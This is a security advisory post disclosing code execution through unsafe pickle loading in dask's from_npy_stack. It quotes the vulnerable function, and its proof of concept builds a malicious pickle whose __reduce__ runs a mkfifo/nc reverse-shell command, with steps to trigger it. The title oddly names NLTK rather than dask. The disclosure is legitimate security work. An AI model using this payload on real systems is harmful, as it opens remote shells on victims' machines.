---
layout: post
title:  "Command injection via unsafe pickle.loads in dask.array.from_npy_stack in NLTK(Informative)"
date:  2024-06-24 10:31:06 +0800
categories: command-injection
---

## Name

> Command injection via unsafe pickle.loads in dask.array.from_npy_stack

## Weakness

> CWE-94: Code Injection

## Severity

> High (8.8)

## Version

> 2024.6.2

## Description

The dask api [`dask.array.from_npy_stack`](https://docs.dask.org/en/stable/generated/dask.array.from_npy_stack.html#dask.array.from_npy_stack) is used to load dask array from stack of npy files. It loads dask arrays from a directory which contains a `info` file. The `info` file saves the information of the dask array. And `from_npy_stack` uses `pickle.load` method to load the `info` file which is a pickle file. If a victim loads a malicious `info` pickle file, command injection can be achieved.

The vulnerable function: [`dask.array.from_npy_stack#L5708`](https://github.com/dask/dask/blob/ff2488aec44d641696e0b7aa41ed9e995c710705/dask/array/core.py#L5708)

```
def from_npy_stack(dirname, mmap_mode="r"):
    """Load dask array from stack of npy files

    Parameters
    ----------
    dirname: string
        Directory of .npy files
    mmap_mode: (None or 'r')
        Read data in memory map mode

    See Also
    --------
    to_npy_stack
    """
    with open(os.path.join(dirname, "info"), "rb") as f:
        # vulnerable to command injection !!!!
        info = pickle.load(f)

    dtype = info["dtype"]
    chunks = info["chunks"]
    axis = info["axis"]

    name = "from-npy-stack-%s" % dirname
    keys = list(product([name], *[range(len(c)) for c in chunks]))
    values = [
        (np.load, os.path.join(dirname, "%d.npy" % i), mmap_mode)
        for i in range(len(chunks[axis]))
    ]
    dsk = dict(zip(keys, values))

    return Array(dsk, name, chunks, dtype)
```

## Proof of Concept

Firstly, create a malicious pickle file. Use following snippets to create a malicous `info` pickle file:

```
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

with open('info', 'wb') as f:
    pickle.dump(RCE(), f)
```

I have uploaded the [`info`](https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle) to github for testing.


## Start attack

Install latest dask:

```
pip install dask
```

Create a malicious dask array directory.

```
example
    |__info
```

Use following snippets to trigger the unsafe `pickle.loads` command injection:

```
import dask.array as da
da.from_npy_stack('example')
```

After the command executed, we can check the `/tmp/f` file is created.

```
> ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
```
## Colab

Tested on google colab: [https://colab.research.google.com/drive/1XaF82Sgt1nmY0hhSu0l_PBnFTQuCyNLq?usp=sharing](https://colab.research.google.com/drive/1XaF82Sgt1nmY0hhSu0l_PBnFTQuCyNLq?usp=sharing)

![image](http://live.staticflickr.com/65535/53822138335_9a3095507b_k.jpg)

## Impact

This vulnerability can have severe consequences. If victims load a malicious dask array folder using `dask.array.from_npy_stack`, command injection can be achieved on victims' mechine.


## Occurrences

[dask.array.from_npy_stack#L5708](https://github.com/dask/dask/blob/ff2488aec44d641696e0b7aa41ed9e995c710705/dask/array/core.py#L5708)

